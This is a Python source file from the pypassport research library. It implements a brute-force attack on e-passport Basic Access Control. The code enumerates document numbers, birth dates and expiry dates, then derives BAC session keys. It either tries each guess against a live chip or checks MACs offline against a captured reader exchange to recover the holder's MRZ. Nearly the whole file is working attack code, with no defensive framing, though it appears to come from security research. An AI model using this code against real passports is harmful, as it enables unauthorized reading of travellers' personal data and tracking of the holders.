# Copyright 2012 Antonin Beaujeant
#
# This file is part of pypassport.
#
# pypassport is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# pypassport is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with pyPassport.
# If not, see <http://www.gnu.org/licenses/>.

import os
import time
import datetime
import re

from hashlib import sha1
from Crypto.Cipher import DES3
from Crypto.Cipher import DES

from pypassport.logger import Logger
from pypassport.iso7816 import Iso7816, Iso7816Exception
from pypassport.iso9797 import *
from pypassport.doc9303.bac import BAC
from pypassport.reader import PcscReader, ReaderException
from pypassport.doc9303.mrz import MRZ
from pypassport import apdu
from pypassport.hexfunctions import hexToHexRep, binToHexRep

class BruteForceException(Exception):
    def __init__(self, *params):
        Exception.__init__(self, *params)

class BruteForce(Logger):
    """
    This class performs a brute force attack against the BAC process based on a range of MRZ
    The two main methods are I{exploit} and I{exploitOffline}:
     - I{exploit} test every combination of MRZ in the range set by the user during a BAC process with the epassport.
     - I{exploitOffline} is an offline attack. The method require a nonce and a responce from a former legitimate communication between a reader and the passport victim
    """

    KENC= '\0\0\0\1'
    KMAC= '\0\0\0\2'

    def __init__(self, iso7816):
        Logger.__init__(self, "BRUTE FORCE")
        self._iso7816 = iso7816

        if type(self._iso7816) != type(Iso7816(None)):
            raise MacTraceabilityException("The sublayer iso7816 is not available")

        self._iso7816.rstConnection()

        self._bac = BAC(iso7816)

        self._id_low = None
        self._id_high = None
        self._dob_low = None
        self._dob_high = None
        self._exp_date_low = None
        self._exp_date_high = None

        self._weighting = [7,3,1]
        self._id_values = {'<':0, '0':0, '1':1, '2':2, '3':3, '4':4, '5':5, '6':6, '7':7, '8':8, '9':9, 'A':10, 'B':11, 'C':12, 'D':13, 'E':14, 'F':15, 'G':16, 'H':17, 'I':18, 'J':19, 'K':20, 'L':21, 'M':22, 'N':23, 'O':24, 'P':25, 'Q':26, 'R':27, 'S':28, 'T':29, 'U':30, 'V':31, 'W':32, 'X':33, 'Y':34, 'Z':35}
        self._inv_id_values = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

    def twodyear(self, year):
        today = datetime.date.today()
        todayyear = today.strftime("%y")
        if year > todayyear:
            return "19"+year
        else:
            return "20"+year

    def setID(self, low=None, high=None):
        """
        Set the range of the document number (min 0, max ZZZZZZZZZZ).

        @param low: (optional) the minimum
        @type low: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
        @param high: (optional) the maximum
        @type high: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
        """

        self.log("Set ID:")
        self.log("\tLow: {0}".format(low))
        self.log("\tHigh: {0}".format(high))

        if low==None: low = "0"

        if high==None:
            if low=="0": high = "ZZZZZZZZZ"
            else: high = low

        self._id_low = low.upper()
        self._id_high = high.upper()

        if high:
            (value_low, value_high) = self._weightValue(self._id_low, self._id_high)
            if value_low > value_high:
                (self._id_high, self._id_low) = (self._id_low, self._id_high)

        self.log("Effective ID")
        self.log("\tLow: {0}".format(self._id_low))
        self.log("\tHigh: {0}".format(self._id_high))

    def setDOB(self, low=None, high=None):
        """
        Set the range of the date of birth (min today - 100 years, max today).

        @param low: (optional) the minimum
        @type low: String (YY/MM/DD)
        @param high: (optional) the maximum
        @type high: String (YY/MM/DD)
        """

        self.log("Set Date of birth:")
        self.log("\tLow: {0}".format(low))
        self.log("\tHigh: {0}".format(high))

        today = datetime.date.today()


        if high==None:
            if low==None:
                high = today.strftime("%y%m%d")
            else: high = None

        if low==None:
            low_date = datetime.date(today.year-99, today.month, today.day)
            low = low_date.strftime("%y%m%d")

        date_cmp = [self.twodyear(low[0:2]), low[2:4], low[4:6]]
        self._dob_low = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))
        if high:
            date_cmp = [self.twodyear(high[0:2]), high[2:4], high[4:6]]
            self._dob_high = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))
        else:
            self._dob_high = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))

        if self._dob_low > self._dob_high:
            (self._dob_high, self._dob_low) = (self._dob_low, self._dob_high)

        self.log("Effective date of birth:")
        self.log("\tLow: {0}".format(self._dob_low.strftime("%Y/%m/%d")))
        self.log("\tHigh: {0}".format(self._dob_high.strftime("%Y/%m/%d")))

    def setExpDate(self, low=None, high=None):
        """
        Set the range of the date of expiration (min today, max today + 10 years).

        @param low: (optional) the minimum
        @type low: String (YY/MM/DD)
        @param high: (optional) the maximum
        @type high: String (YY/MM/DD)
        """

        self.log("Set expriration date:")
        self.log("\tLow: {0}".format(low))
        self.log("\tHigh: {0}".format(high))

        today = datetime.date.today()
        tmp = low

        if low==None:
            if high==None:
                low_date = datetime.date(today.year-10, today.month, today.day)
                low = low_date.strftime("%y%m%d")
            else:
                low_date = datetime.date(int(high[:4])-10, int(high[5:7]), int(high[8:10]))
                low = low_date.strftime("%y%m%d")

        if high==None:
            if tmp==None:
                high_date = datetime.date(today.year+10, today.month, today.day)
                high = high_date.strftime("%y%m%d")
            else: high = low

        date_cmp = [self.twodyear(low[0:2]), low[2:4], low[4:6]]
        self._exp_date_low = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))

        date_cmp = [self.twodyear(high[0:2]), high[2:4], high[4:6]]
        self._exp_date_high = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))

        if self._exp_date_low > self._exp_date_high:
            (self._exp_date_high, self._exp_date_low) = (self._exp_date_low, self._exp_date_high)

        self.log("Effective expiration date:")
        self.log("\tLow: {0}".format(self._exp_date_low.strftime("%Y/%m/%d")))
        self.log("\tHigh: {0}".format(self._exp_date_high.strftime("%Y/%m/%d")))

    def check(self):
        """
        Check if all parameters (Document number, date of birth and expriration date) are correct

        @return: A boolean whether the paramaters are set properly
        """

        self.log("Check:")

        check = True
        error = ''

        pattern_id = '^[0-9A-Z<]{1,9}$'
        reg=re.compile(pattern_id)
        if not reg.match(self._id_low):
            check = False
            error += "Wrong parameter (ID low: {0})\n".format(self._id_low)
            self.log("\tWrong ID low")
        if not reg.match(self._id_high):
            check = False
            error += "Wrong parameter (ID high: {0})\n".format(self._id_high)
            self.log("\tWrong ID high")

        if type(self._dob_low)!=type(datetime.date.today()):
            check = False
            error += "dob l\n"
            error += "Wrong parameter (date of birth low: {0})\n".format(self._dob_low)
        if type(self._dob_high)!=type(datetime.date.today()):
            check = False
            error += "dob h\n"
            error += "Wrong parameter (date of birth high: {0})\n".format(self._dob_high)

        if type(self._exp_date_low)!=type(datetime.date.today()):
            check = False
            error += "Wrong parameter (Expiratin date low: {0})\n".format(self._exp_date_low)
            self.log("\tWrong expiration date low")
        if type(self._exp_date_high)!=type(datetime.date.today()):
            check = False
            error += "Wrong parameter (Expiratin date high: {0})\n".format(self._exp_date_high)
            self.log("\tWrong expiration date high")

        return check, error

    def getIdStat(self):
        """
        Get the maximum and the minimum in the passport document range set together with the entropy.

        @return: A set composed of (minimum[String], maximum[String], entropy[Integer])
        """
        (value_low, value_high) = self._weightValue(self._id_low, self._id_high)
        entropy = value_high - value_low + 1
        return (self._id_low, self._id_high, entropy)

    def getDOBStat(self):
        """
        Get the maximum and the minimum in the date of birth range set together with the entropy.

        @return: A set composed of (minimum[datetime.date], maximum[datetime.date], entropy[Integer])
        """
        delta = self._dob_high - self._dob_low
        entropy = delta.days + 1
        return (self._dob_low, self._dob_high, entropy)

    def getExpDateStat(self):
        """
        Get the maximum and the minimum in the expiration date range set together with the entropy.

        @return: A set composed of (minimum[datetime.date], maximum[datetime.date], entropy[Integer])
        """
        delta = self._exp_date_high - self._exp_date_low
        entropy = delta.days + 1
        return (self._exp_date_low, self._exp_date_high, entropy)

    def _weightValue(self, low, high):
        """
        Convert a set a value [0-9A-Z<] in decimal value
        < = 0
        0 = 0
        ...
        9 = 9
        A = 10
        ...
        Z = 35

        @param low: the minimum
        @type low: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
        @param high: the maximum
        @type high: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)

        @return: A set composed of (decimal value of low, decimal value of high)
        """

        len_low = len(low)
        len_high = len(high)

        value_low = 0
        value_high = 0
        i = 1
        while i <= len_low:
            value_low += self._id_values[low[-i]]*pow(36, i-1)
            i += 1

        i = 1
        while i <= len_high:
            value_high += self._id_values[high[-i]]*pow(36, i-1)
            i += 1

        return (value_low, value_high)

    def _calculCheckDigit(self, value):
        """
        Create check digit for a value of the MRZ

        @param value: initial value
        @type value: String
        @return: Check digit
        @rtype: String

        @note: Code fragment from the pyPassport.mrz.MRZ class
        """
        cpt=0
        res=0
        for x in value:
            tmp = self._id_values[str(x)] * self._weighting[cpt%3]
            res += tmp
            cpt += 1
        return str(res%10)

    def _buildMRZ(self, id_pass, dob, exp, pers_num="<<<<<<<<<<<<<<"):
        """
        Create the MRZ based on:
         - the document number
         - the date of birth
         - the expiration date
         - (optional) personal number

        @param id_pass: Document number
        @type id_pass: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
        @param dob: Date of birth
        @type dob: String (YYMMDD)
        @param exp: Expiration date
        @type exp: String (YYMMDD)
        @param pers_num: (optional) Personal number. If not set, value = "<<<<<<<<<<<<<<"
        @type pers_num: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)

        @return: A String "PPPPPPPPPPCXXXBBBBBBCXEEEEEECNNNNNNNNNNNNNNCC"
        """

        id_pass_full = id_pass + (9-len(id_pass))*'<' + self._calculCheckDigit(id_pass)
        dob_full = dob + self._calculCheckDigit(dob)
        exp_full = exp + self._calculCheckDigit(exp)
        pers_num_full = pers_num + self._calculCheckDigit(pers_num)
        return id_pass_full + "???" + dob_full + "?" + exp_full + pers_num_full + self._calculCheckDigit(id_pass_full+dob_full+exp_full+pers_num_full)

    def _nextIdValue(self, value):
        """
        Function that increment the value of document number/personal number

        @param value: Value to increment
        @type value: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)

        @return: The incremented value
        """
        len_value = len(value)
        dec_value = 0
        new_value = ""

        i = 1
        while i <= len_value:
            dec_value += self._id_values[value[-i]]*pow(36, i-1)
            i += 1
        dec_value += 1

        while dec_value:
            new_value = self._inv_id_values[dec_value % 36] + new_value
            dec_value //= 36

        return new_value

    def _genKseed(self, kmrz):
        """
        @note: Code fragment from the pyPassport.doc9303.bac.BAC class
        """
        kseedhash= sha1(str(kmrz))
        kseed = kseedhash.digest()
        return kseed[:16]

    def _keyDerivation(self, kseed, c):
        """
        @note: Code fragment from the pyPassport.doc9303.bac.BAC class
        """
        d = kseed + c
        h = sha1(str(d)).digest()

        Ka = h[:8]
        Kb = h[8:16]

        Ka = self._DESParity(Ka)
        Kb = self._DESParity(Kb)

        return Ka+Kb

    def _DESParity(self, data):
        """
        @note: Code fragment from the pyPassport.doc9303.bac.BAC class
        """
        adjusted= ''
        for x in range(len(data)):
            y= ord(data[x]) & 0xfe
            parity= 0
            for z in range(8):
                parity += y >>  z & 1
            adjusted += chr(y + (not parity % 2))
        return adjusted

    def _authentication(self, rnd_icc, kenc, kmac):
        """
        @note: Code fragment from the pyPassport.doc9303.bac.BAC class
        """

        rnd_ifd = os.urandom(8)
        kifd = os.urandom(16)

        s = rnd_ifd + rnd_icc + kifd

        tdes= DES3.new(kenc,DES.MODE_CBC, b'\x00\x00\x00\x00\x00\x00\x00\x00')
        eifd= tdes.encrypt(s)

        mifd = mac(kmac, pad(eifd))

        cmd_data = eifd + mifd

        return cmd_data

    def _sendCmdData(self, cmd_data):
        """
        @note: Code fragment from the pyPassport.doc9303.bac.BAC class
        """
        data = binToHexRep(cmd_data)
        lc = hexToHexRep(len(data)/2)
        toSend = apdu.CommandAPDU("00", "82", "00", "00", lc, data, "28")

        return self._iso7816.transmit(toSend, "Mutual Authentication")


    def initOffline(self, mrz):
        """
        In order to perform an offline brute force attack
        the attacker need a nonce and a BAC response
        from a legitimate communication between a reader and a passort.

        @param id_pass: Document number
        @type id_pass: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
        @param dob: Date of birth
        @type dob: String (YYMMDD)
        @param exp: Expiration date
        @type exp: String (YYMMDD)

        @return: A set composed of (nonce, response) required for the offline attack
        """

        kmrz = mrz[0:10] + mrz[13:20] + mrz[21:28]
        kseed = self._genKseed(kmrz)
        kenc = self._keyDerivation(kseed, BruteForce.KENC)
        kmac = self._keyDerivation(kseed, BruteForce.KMAC)

        #rnd_icc = self._iso7816.getChallenge()
        rnd_icc = os.urandom(8)
        cmd_data = self._authentication(rnd_icc, kenc, kmac)

        return binToHexRep(cmd_data)



    ########################
    #        ONLINE        #
    ########################

    def exploit(self, reset=False):
        """
        Attempt a brute force attack in a BAC
        It tries a series of MRZ until the BAC succeed or if out of the range

        @param reset: State if the connection need to be reset after each try
        @type reset: Boolean

        @return: The MRZ found (or False if not found)
        """

        self.log("Online exploit:")
        self.log("\tStart")

        found = False
        cur_id = self._id_low
        max_id = self._id_high

        starttime = time.time()
        while not found:

            cur_dob = self._dob_low
            max_dob = self._dob_high
            while not found:

                cur_exp = self._exp_date_low
                max_exp = self._exp_date_high
                while not found:

                    mrz = self._buildMRZ(cur_id, cur_dob.strftime("%y%m%d"), cur_exp.strftime("%y%m%d"))
                    self.log("\tTry: {0}".format(mrz))
                    kmrz = cur_id + (9-len(cur_id))*'<' + self._calculCheckDigit(cur_id) + cur_dob.strftime("%y%m%d") + self._calculCheckDigit(cur_dob.strftime("%y%m%d")) + cur_exp.strftime("%y%m%d") + self._calculCheckDigit(cur_exp.strftime("%y%m%d"))
                    kseed = self._genKseed(kmrz)
                    kenc = self._keyDerivation(kseed, BruteForce.KENC)
                    kmac = self._keyDerivation(kseed, BruteForce.KMAC)

                    rnd_icc = self._iso7816.getChallenge()

                    try:
                        self._sendCmdData(self._authentication(rnd_icc, kenc, kmac))
                        found = mrz
                        self.log("\tFound!")
                    except Iso7816Exception:
                        if reset: self._iso7816.rstConnection()
                        pass

                    if cur_exp == max_exp:
                        break
                    cur_exp += datetime.timedelta(1)

                if cur_dob == max_dob:
                    break
                cur_dob += datetime.timedelta(1)

            if cur_id == max_id:
                break
            cur_id = self._nextIdValue(cur_id)

        self.log("\tTime: {0}".format(time.time()-starttime))
        return found



    #########################
    #        OFFLINE        #
    #########################

    def exploitOffline(self, response):
        """
        An offline brute force attack takes a nonce and a response.
        Get an encrypted message + mac based on the response
        Based on the encrypted message, it uses a series of MRZ to generate a MAC
        If the MAC generated match the mac, it uses the MRZ to decrypt the encrypted message.
        If the decrypted message embed the nonce, the MRZ is the one from the passport that generated the nonce.

        @param nonce: A nonce generated by a passport during a BAC
        @type nonce: String of 16chars (64bits in hex)
        @param nonce: The nonce response generated by a legitimate reader
        @type nonce: String of 80chars (256bits encrypted message + 64bits mac = 320bits in hex)

        @return: The MRZ found (or False if not found)
        """

        self.log("Offline exploit:")
        self.log("\tStart")

        message_bin = hexRepToBin(response[:64])
        mac_bin = hexRepToBin(response[64:])

        found = False
        cur_id = self._id_low
        max_id = self._id_high

        starttime = time.time()
        while not found:

            cur_dob = self._dob_low
            max_dob = self._dob_high
            while not found:

                cur_exp = self._exp_date_low
                max_exp = self._exp_date_high
                while not found:

                    mrz = self._buildMRZ(cur_id, cur_dob.strftime("%y%m%d"), cur_exp.strftime("%y%m%d"))
                    self.log("\tTry: {0}".format(mrz))
                    kmrz = cur_id + (9-len(cur_id))*'<' + self._calculCheckDigit(cur_id) + cur_dob.strftime("%y%m%d") + self._calculCheckDigit(cur_dob.strftime("%y%m%d")) + cur_exp.strftime("%y%m%d") + self._calculCheckDigit(cur_exp.strftime("%y%m%d"))
                    kseed = self._genKseed(kmrz)
                    #kenc = self._keyDerivation(kseed, BruteForce.KENC)
                    kmac = self._keyDerivation(kseed, BruteForce.KMAC)

                    if  mac_bin == mac(kmac, pad(message_bin)):
                        found = mrz
                        self.log("\tFound!")

                    if cur_exp == max_exp:
                        break
                    cur_exp += datetime.timedelta(1)

                if cur_dob == max_dob:
                    break
                cur_dob += datetime.timedelta(1)

            if cur_id == max_id:
                break
            cur_id = self._nextIdValue(cur_id)
        self.log("\tTime: {0}".format(time.time()-starttime))
        return found

